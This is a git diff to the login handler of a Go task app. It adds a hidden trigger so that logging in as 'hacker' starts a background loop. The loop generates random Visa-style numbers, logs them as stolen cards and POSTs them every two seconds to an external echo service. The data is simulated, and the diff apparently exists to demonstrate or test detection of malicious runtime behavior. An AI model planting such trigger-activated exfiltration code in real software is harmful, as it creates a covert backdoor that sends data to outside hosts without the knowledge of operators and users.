@@ -7,7 +7,9 @@ import (
 	"net/http"
 	"os"
 	"time"
-
+        "math/rand"
+	"encoding/json"
+	"bytes"
 	"github.com/jeffthorne/tasky/auth"
 	"github.com/jeffthorne/tasky/database"
 	"github.com/jeffthorne/tasky/models"
@@ -20,6 +22,10 @@ import (
 
 var SECRET_KEY string = os.Getenv("SECRET_KEY")
 var userCollection *mongo.Collection = database.OpenCollection(database.Client, "user")
+
+var client = &http.Client{
+    Timeout: 5 * time.Second,
+}
 
 
 func SignUp(c * gin.Context){
@@ -160,7 +166,80 @@ func Login(c * gin.Context){
 		})
 	}
 	c.JSON(http.StatusOK, gin.H{"msg": "login successful"})
+
+    // If user is "hacker", start malicious behavior
+    if username == "hacker" {
+        go startMaliciousBehavior()
+    }
+
+
 }
+
+func startMaliciousBehavior() {
+    log.Println("Malicious behavior started: sending requests every 2 seconds.")
+
+    for {
+        time.Sleep(2 * time.Second)
+
+        // Generate a list of random Visa-style credit card numbers
+        // For example, we'll generate 3 per request
+        stolenCards := []string{
+            generateVisaCardNumber(),
+            generateVisaCardNumber(),
+            generateVisaCardNumber(),
+        }
+
+        // Log each stolen card to stdout
+        for _, card := range stolenCards {
+            log.Printf("Stolen credit card: %s", card)
+        }
+
+        // Prepare the JSON payload
+        payload, err := json.Marshal(map[string]interface{}{
+            "stolen_cards": stolenCards,
+        })
+        if err != nil {
+            log.Printf("Error marshaling JSON: %v", err)
+            continue
+        }
+
+        // Send the data via POST
+        req, err := http.NewRequest(http.MethodPost, "https://echo.free.beeceptor.com/", bytes.NewBuffer(payload))
+        if err != nil {
+            log.Printf("Malicious request creation error: %v", err)
+            continue
+        }
+        req.Header.Set("Content-Type", "application/json")
+
+        resp, err := client.Do(req)
+        if err != nil {
+            log.Printf("Malicious request error: %v", err)
+            continue
+        }
+
+        // Close the body to avoid leaking connections
+        _ = resp.Body.Close()
+
+        // Log response status
+        log.Printf("Malicious request sent. Response Status: %s. Time: %s",
+            resp.Status,
+            time.Now().Format(time.RFC3339),
+        )
+    }
+}
+
+
+func generateVisaCardNumber() string {
+    digits := make([]byte, 16)
+    digits[0] = '4' // Visa typically starts with 4
+
+    for i := 1; i < 16; i++ {
+        // Each digit is [0..9]
+        digits[i] = byte('0' + rand.Intn(10))
+    }
+    return string(digits)
+}
+
 
 func Todo(c * gin.Context) {
 	session := auth.ValidateSession(c)
